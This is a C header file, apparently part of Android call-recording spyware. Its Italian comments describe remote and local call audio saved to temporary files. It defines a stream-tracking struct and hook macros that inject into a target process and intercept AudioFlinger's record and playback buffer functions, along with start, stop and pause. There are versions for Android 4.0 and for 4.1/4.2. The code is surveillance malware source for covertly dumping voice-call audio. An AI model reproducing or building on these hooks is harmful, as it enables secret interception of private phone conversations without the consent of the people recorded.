#include <sys/types.h>
#include <sys/time.h>
#include <time.h>
#include "../uthash.h"

#define ROUNDUP(x, y) ((((x)+((y)-1))/(y))*(y))
#define DBG 1

#define FILESIZE 1048576

struct hook_t *hook_hash1;
struct hook_t *postcall_hash;


/* From audio.h Audio stream types */
typedef enum {
    AUDIO_STREAM_DEFAULT          = -1,
    AUDIO_STREAM_VOICE_CALL       = 0,
    AUDIO_STREAM_SYSTEM           = 1,
    AUDIO_STREAM_RING             = 2,
    AUDIO_STREAM_MUSIC            = 3,
    AUDIO_STREAM_ALARM            = 4,
    AUDIO_STREAM_NOTIFICATION     = 5,
    AUDIO_STREAM_BLUETOOTH_SCO    = 6,
    AUDIO_STREAM_ENFORCED_AUDIBLE = 7, /* Sounds that cannot be muted by user and must be routed to speaker */
    AUDIO_STREAM_DTMF             = 8,
    AUDIO_STREAM_TTS              = 9,
    AUDIO_STREAM_CNT,
    AUDIO_STREAM_MAX              = AUDIO_STREAM_CNT - 1,
} audio_stream_type_t;


struct cblk_t {

  unsigned int cblk_index; // address of cblk struct in memory, used as the key
  unsigned int sampleRate;
  int streamType;
  
  unsigned int finished;

  
  // Qi-<epoch time>-r.tmp per audio remoto
  // Qi-<epoch time>-l.tmp per audio locale
  // Qi-<timestamp>-<id univoco per chiamata>-<canale>.[tmp|boh]
  //  2-10-10-1-3-1(null) 
  char* trackId; 
  char *filename;
  int fd;

  /* getNextBuffer hook  */
  unsigned int playbackLastBufferStartAddress; // last buffer start address returned for this cblk 

 
  /* getNextBuffer2 hook */
  unsigned int lastBufferRaw;
  unsigned int lastFrameCount;
  unsigned int lastFrameSize;
  
  /* getNextBuffer3 hook */
  unsigned int startOfCircularBuffer;
  unsigned int frameCount;
  
  unsigned long fileOffset; // global offset, needed to recompose the tracks

  int stopDump; // for record

  UT_hash_handle hh;
  

};


unsigned int base_address;

void* no_proto(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) ;

// 1] function prototype

void* recordTrack_getNextBuffer3_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) ;
void* playbackTrack_getNextBuffer3_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) ;


void* recordThread_getNextBuffer_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) ;
void* playbackTimedTrack_getNextBuffer_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) ;

void* newRecordTrack_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) ;

/* signaling */
void* recordTrackStart_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) ;
void* playbackTrackStart_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) ;
void* playbackTrackPause_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) ;
void* newTrack_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) ;

void* recordTrackStop_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) ;
void* playbackTrackStop_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) ;

// 2] hook

struct hook_t newTrack_hook;


struct hook_t getBuffer_hook;


struct hook_t recordTrack_getNextBuffer_hook;
struct hook_t playbackTrack_getNextBuffer_hook;

struct hook_t recordThread_getNextBuffer_hook;
struct hook_t playbackTimedTrack_getNextBuffer_hook;

/* signaling */
struct hook_t playbackTrackStart_hook;
struct hook_t playbackTrackStop_hook;
struct hook_t playbackTrackPause_hook;

struct hook_t recordTrackStart_hook;
struct hook_t recordTrackStop_hook;


struct hook_t newRecordTrack_hook;


unsigned long audioFlingerInstance;
unsigned long pbInstance;

// getBuffer globals
unsigned long bufferStart;
unsigned long lastSize;
unsigned long lastOffset;

unsigned long lastFrameSize;
unsigned long lastBufferStart;
unsigned long lastBufferEnd;

// recordTrack_getNextBuffer globals
unsigned long lastBufferStartAddress;
 

// 3] insert the hook

/* Hooks for Android 4.1,4.2 */

/* dumpers */
#define HOOK_coverage_11 hook_no_hash(&recordTrack_getNextBuffer_hook, pid, "libaudioflinger", "_ZN7android12AudioFlinger12RecordThread11RecordTrack13getNextBufferEPNS_19AudioBufferProvider6BufferEx", recordTrack_getNextBuffer3_h, 1,  0);//0x35275);
#define HOOK_coverage_12 hook_no_hash(&playbackTrack_getNextBuffer_hook, pid, "libaudioflinger", "_ZN7android12AudioFlinger14PlaybackThread5Track13getNextBufferEPNS_19AudioBufferProvider6BufferEx", playbackTrack_getNextBuffer3_h, 1, 0);// 0x352d1);

/* signaling hooks */

// PlaybackThread::Track
#define HOOK_coverage_2 hook_no_hash(&newTrack_hook, pid, "libaudioflinger", "_ZN7android12AudioFlinger14PlaybackThread5TrackC2EPS1_RKNS_2spINS0_6ClientEEE19audio_stream_type_tj14audio_format_tjiRKNS4_INS_7IMemoryEEEij", newTrack_h, 1,  0);
#define HOOK_coverage_17 hook_no_hash(&playbackTrackStart_hook, pid, "libaudioflinger", "_ZN7android12AudioFlinger14PlaybackThread5Track5startENS_11AudioSystem12sync_event_tEi", playbackTrackStart_h, 1, 0);

#define HOOK_coverage_19 hook_no_hash(&playbackTrackStop_hook, pid, "libaudioflinger", "_ZN7android12AudioFlinger14PlaybackThread5Track4stopEv", playbackTrackStop_h, 1, 0);
#define HOOK_coverage_20 hook_no_hash(&playbackTrackPause_hook,  pid, "libaudioflinger", "_ZN7android12AudioFlinger14PlaybackThread5Track5pauseEv", playbackTrackPause_h, 1,  0);

// RecordThread::RecordTrack
#define HOOK_coverage_16 hook_no_hash(&recordTrackStart_hook, pid, "libaudioflinger", "_ZN7android12AudioFlinger12RecordThread11RecordTrack5startENS_11AudioSystem12sync_event_tEi", recordTrackStart_h, 1, 0);
#define HOOK_coverage_18 hook_no_hash(&recordTrackStop_hook, pid, "libaudioflinger", "_ZN7android12AudioFlinger12RecordThread11RecordTrack4stopEv", recordTrackStop_h, 1, 0);


/* Hooks for android 4.0 
 * 
 * hooks 18, 19, 20, are ok */

/* dumpers 4.0 */
#define HOOK_coverage_40_11 hook_no_hash(&recordTrack_getNextBuffer_hook, pid, "libaudioflinger", "_ZN7android12AudioFlinger12RecordThread11RecordTrack13getNextBufferEPNS_19AudioBufferProvider6BufferE", recordTrack_getNextBuffer3_h, 1,  0);
#define HOOK_coverage_40_12 hook_no_hash(&playbackTrack_getNextBuffer_hook, pid, "libaudioflinger", "_ZN7android12AudioFlinger14PlaybackThread5Track13getNextBufferEPNS_19AudioBufferProvider6BufferE", playbackTrack_getNextBuffer3_h, 1, 0);


/* signaling 4.0 */

// PlaybackThread::Track
#define HOOK_coverage_40_2 hook_no_hash(&newTrack_hook, pid, "libaudioflinger", "_ZN7android12AudioFlinger14PlaybackThread5TrackC2ERKNS_2wpINS0_10ThreadBaseEEERKNS_2spINS0_6ClientEEEijjjiRKNS8_INS_7IMemoryEEEi", newTrack_h, 1,  0);
#define HOOK_coverage_40_17 hook_no_hash(&playbackTrackStart_hook, pid, "libaudioflinger", "_ZN7android12AudioFlinger14PlaybackThread5Track5startEv", playbackTrackStart_h, 1, 0);

// RecordThread::RecordTrack
#define HOOK_coverage_40_16 hook_no_hash(&recordTrackStart_hook, pid, "libaudioflinger", "_ZN7android12AudioFlinger12RecordThread11RecordTrack5startEv", recordTrackStart_h, 1, 0);
